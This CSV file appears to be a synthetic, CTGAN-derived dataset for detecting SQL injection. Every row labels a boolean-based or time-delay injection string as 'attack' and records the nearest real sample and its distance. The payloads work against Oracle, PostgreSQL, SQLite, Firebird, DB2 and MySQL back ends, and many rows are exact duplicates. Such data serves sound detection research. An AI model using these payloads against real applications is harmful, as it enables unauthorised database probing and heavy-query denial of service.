id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000930,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,6.435496305601207
CTGAN_000931,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.381870234873838
CTGAN_000932,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.994782438779798
CTGAN_000933,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,6.545706546214891
CTGAN_000934,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000154,6.07473858038059
CTGAN_000935,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,7.984537071988401
CTGAN_000936,attack,boolean,1' in boolean mode  )   and 5725  =  5552#,nearest_attack_euclidean,R000081,6.215757395304914
CTGAN_000937,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000086,7.936791606181752
CTGAN_000938,attack,boolean,"1%"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000010,6.167569912168241
CTGAN_000939,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,5.093594777829237
CTGAN_000940,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,4.693669905209366
CTGAN_000941,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,7.435391266308425
CTGAN_000942,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,4.57522847269604
CTGAN_000943,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,6.5660849886998625
CTGAN_000944,attack,boolean,1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',nearest_attack_euclidean,R000020,5.8473253078936995
CTGAN_000945,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,5.056992727379603
CTGAN_000946,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000088,4.6627848450918234
CTGAN_000947,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000075,8.691440171266697
CTGAN_000948,attack,boolean,"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000045,7.436791284719172
CTGAN_000949,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,4.8191713837844
CTGAN_000950,attack,boolean,1' and 7533  =  7533 and 'frvk'  =  'frvk,nearest_attack_euclidean,R000039,7.922775472215502
CTGAN_000951,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,7.87239965835375
CTGAN_000952,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,6.531144646971017
CTGAN_000953,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,4.7155098349340445
CTGAN_000954,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000148,6.39528115268513
CTGAN_000955,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000032,5.552808097697735
CTGAN_000956,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000151,6.498362720281918
CTGAN_000957,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,5.22924462210558
CTGAN_000958,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000015,6.876283362320519
CTGAN_000959,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000037,7.2536245499178404
CTGAN_000960,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000152,6.090160335054252
CTGAN_000961,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,5.887576802975226
CTGAN_000962,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000109,6.389956880927085
CTGAN_000963,attack,boolean,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,nearest_attack_euclidean,R000149,6.757188332237888
CTGAN_000964,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,5.170349201203834
CTGAN_000965,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,5.7891465821849835
CTGAN_000966,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,6.06162686203474
CTGAN_000967,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000140,5.818106759157482
CTGAN_000968,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000102,3.56264878339328
CTGAN_000969,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,7.153575044309825
CTGAN_000970,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,5.843217774017562
CTGAN_000971,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000030,4.783573559579767
CTGAN_000972,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,3.820038770162322
CTGAN_000973,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000113,8.896790969663915
CTGAN_000974,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,8.046829017351001
CTGAN_000975,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,6.681228131297606
CTGAN_000976,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,5.3542858462809955
CTGAN_000977,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,4.701122064421218
CTGAN_000978,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,6.004976963796303
CTGAN_000979,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,6.4782094482252255
CTGAN_000980,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,4.482151380696725
CTGAN_000981,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,6.478136826381064
CTGAN_000982,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,6.727044747648601
CTGAN_000983,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000113,6.038136250839577
CTGAN_000984,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,5.868151704076646
CTGAN_000985,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000147,6.259566891862434
CTGAN_000986,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,6.157487631160054
CTGAN_000987,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,5.06468918398139
CTGAN_000988,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,5.096954519924785
CTGAN_000989,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,5.975048746322026
CTGAN_000990,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000035,6.317740850118664
CTGAN_000991,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000062,6.7910428864729075
CTGAN_000992,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,6.076158064343013
CTGAN_000993,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000101,4.002911412063225
CTGAN_000994,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,3.9443489189239163
CTGAN_000995,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,5.272116430360033
CTGAN_000996,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,5.913745403299426
CTGAN_000997,attack,boolean,"1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw",nearest_attack_euclidean,R000021,5.286202056448803
CTGAN_000998,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,5.620862838672857
CTGAN_000999,attack,boolean," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",nearest_attack_euclidean,R000007,8.3797661905763
CTGAN_001000,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,8.858624004091329
CTGAN_001001,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000037,8.691862197509515
CTGAN_001002,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,6.561323528517593
CTGAN_001003,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000117,6.502547545802434
CTGAN_001004,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,6.784896087665361
CTGAN_001005,attack,boolean,-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,nearest_attack_euclidean,R000071,7.3360227124026824
CTGAN_001006,attack,boolean,"1   )    )    as xsyk where 2575  =  2575 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000051,6.595582885965979
CTGAN_001007,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,5.974714764340761
CTGAN_001008,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,6.690808366255202
CTGAN_001009,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,5.589341629102309
CTGAN_001010,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,6.196069497818313
CTGAN_001011,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000032,6.662578577476283
CTGAN_001012,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000027,5.382364413088556
CTGAN_001013,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000013,4.312354214917848
CTGAN_001014,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R000110,6.780614777037213
CTGAN_001015,attack,boolean,"1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000043,6.023928029507994
CTGAN_001016,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000075,6.705965551588545
CTGAN_001017,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,5.9718287177622855
CTGAN_001018,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'ukxj'  =  'ukxj",nearest_attack_euclidean,R000137,4.522210174908407
CTGAN_001019,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,3.9410236941703376
CTGAN_001020,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000016,8.135730572929006
CTGAN_001021,attack,boolean,-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg,nearest_attack_euclidean,R000109,4.409084291463387
CTGAN_001022,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000032,5.622523100795015
CTGAN_001023,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,5.399488225924027
CTGAN_001024,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000148,4.683674209834157
CTGAN_001025,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000128,5.223079992632039
CTGAN_001026,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000080,4.825730528659367
CTGAN_001027,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,6.485521880006018
CTGAN_001028,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,6.795375992028322
CTGAN_001029,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000152,7.639347543898495
CTGAN_001030,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,7.311305779042025
CTGAN_001031,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000107,4.802668031378445
CTGAN_001032,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000087,6.419291381276409
CTGAN_001033,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000037,6.1541379726105685
CTGAN_001034,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",nearest_attack_euclidean,R000103,5.573925436780204
CTGAN_001035,attack,boolean,"1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000123,5.019981168548299
CTGAN_001036,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,5.353585625528804
CTGAN_001037,attack,boolean,"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000014,5.481626526977798
CTGAN_001038,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,9.114089851614995
CTGAN_001039,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R000108,5.840834346068347
CTGAN_001040,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R000031,4.702422066475578
CTGAN_001041,attack,boolean,"1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'",nearest_attack_euclidean,R000138,7.406068943737219
CTGAN_001042,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,6.372528685072025
CTGAN_001043,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000015,5.81160709052856
CTGAN_001044,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,4.978250021666687
CTGAN_001045,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000145,7.778904602465218
CTGAN_001046,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,4.262295413329256
CTGAN_001047,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000100,6.153029882645882
CTGAN_001048,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000037,9.369165783960566
CTGAN_001049,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000056,6.256094927084302
CTGAN_001050,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,6.167414082267967
CTGAN_001051,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000053,6.556115946618082
CTGAN_001052,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000064,5.346550275722616
CTGAN_001053,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000145,6.142298239862082
CTGAN_001054,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000050,4.90225727293448
CTGAN_001055,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000065,6.490209814834349
CTGAN_001056,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000050,6.108301355372027
CTGAN_001057,attack,boolean,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R000074,6.778052479655723
CTGAN_001058,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000075,5.077777739720922
